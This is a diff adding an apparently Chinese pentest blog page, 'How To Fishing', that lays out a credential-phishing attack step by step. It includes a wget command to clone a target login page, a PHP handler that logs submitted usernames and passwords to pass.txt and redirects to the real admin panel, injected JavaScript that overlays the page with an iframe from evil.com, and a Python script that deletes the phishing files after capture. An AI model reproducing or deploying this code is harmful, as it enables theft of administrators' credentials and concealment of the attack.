@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>How To Fishing</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/how-to-fishing.html" rel="bookmark"
+           title="Permalink to How To Fishing">How To Fishing</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-04-01T00:00:00+02:00">
+                <a href='#'>04/01/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
+<p>准备材料：</p>
+<div class="highlight"><pre><span></span><span class="err">目标登录页面</span><span class="o">:</span> <span class="n">login</span><span class="o">.</span><span class="na">html</span>
+<span class="err">假的登录页面</span><span class="o">:</span> <span class="n">fake</span><span class="o">.</span><span class="na">html</span>
+<span class="err">世界上最好的语言</span><span class="o">:</span> <span class="n">deal</span><span class="o">.</span><span class="na">php</span>
+<span class="n">fish</span><span class="o">.</span><span class="na">js</span>
+</pre></div>
+
+
+<p>步骤:</p>
+<ul>
+<li>先下载目标login.html，保存为fake.html
+wget -r -p -np -k 网站地址</li>
+</ul>
+<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action="http://normal.com/login.php" method="post"&gt;</code>，替换掉自己的deal.php页面。</p>
+<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
+<ul>
+<li>然后再服务器上构造一个deal.php</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+<span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+<span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;pass.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s2">&quot;User:&quot;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&quot;Pass:&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: http://normal.com/manage&quot;</span><span class="p">);</span> <span class="c1">//跳转到正常的后台</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>还差一个js</li>
+</ul>
+<div class="highlight"><pre><span></span> document.body.innerHTML=&#39;<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;position:absolute;top:0px;left:0px;width:100%;height:100%&quot;</span><span class="nt">&gt;</span>&#39;+
+&#39;<span class="nt">&lt;iframe</span> <span class="na">frameborder=</span><span class="s">&quot;no&quot;</span> <span class="na">scrolling=</span><span class="s">&quot;no&quot;</span> <span class="na">border=</span><span class="s">&quot;no&quot;</span> <span class="na">src=</span><span class="s">http://evil.com/fake.html</span> <span class="na">width=</span><span class="s">100%</span> <span class="na">height=</span><span class="s">100%</span><span class="nt">&gt;</span>&#39; +
+&#39;<span class="nt">&lt;/iframe&gt;&lt;/div&gt;</span>&#39;
+</pre></div>
+
+
+<p>当fish.js插入到后台的时候，会覆盖掉当前页面，然后受害者输入用户密码，就可以在服务器上收到用户密码。</p>
+<p>这里存在一个问题，如果受害者的页面不停刷新，会一致执行js，一直出现fake登录页面，所以可以在服务区上执行一个python脚本，监听pass.txt文件是否是空，不是空就退出，同时删除掉fish.js和fake.html</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># coding: utf-8</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">datetime</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="s1">&#39;pass.txt&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf fish.js&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf fake.html&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+<p>至此构造完成，当python脚本退出的时候，密码就记录到了pass.txt文件</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
